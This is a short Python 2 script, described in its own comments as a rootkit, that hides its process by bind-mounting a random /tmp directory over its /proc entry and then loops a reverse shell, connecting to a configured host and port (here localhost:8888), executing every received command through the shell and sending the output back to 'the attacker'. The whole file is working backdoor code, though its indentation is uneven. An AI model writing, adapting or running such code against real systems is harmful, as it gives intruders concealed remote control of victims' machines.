#!/usr/bin/python


import os,socket,subprocess,string,time
import random as r
ch = string.uppercase + string.digits # Strings to generate the temporary random process name from
token = "".join(r.choice(ch) for i in range(72)) #Loop to generate the string
pid = os.getpid() # Get process id
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token)) # make bind mount on the current process folder in /proc to hide it 
host = "localhost" # Host to connect back to.
port = 8888 # Port to connect back to.
print "[+]Rootkit is working now , check your connection  .. " # print message for debugging issues 
def MakeConnection(h,p): 
	try: # Try to make connection
		time.sleep(5) # Reverse connection interval
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		sock.connect((h,p))
		while True:

				command =  sock.recv(1024) # Receive command from the attacker
			        if command.strip("\n") == "exit": # Exit if the attacker sent exit command
                		     sock.close() # Close socket
       			        proc = subprocess.Popen(command , stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
        			proc_result = proc.stdout.read() + proc.stderr.read() # Read the command and store the result 
        			sock.send(proc_result) # Send the result back to the attacker

	except socket.error:
		pass  # If any connection error happend , through exception



while True:
	MakeConnection(host,port) # Call the main fuction

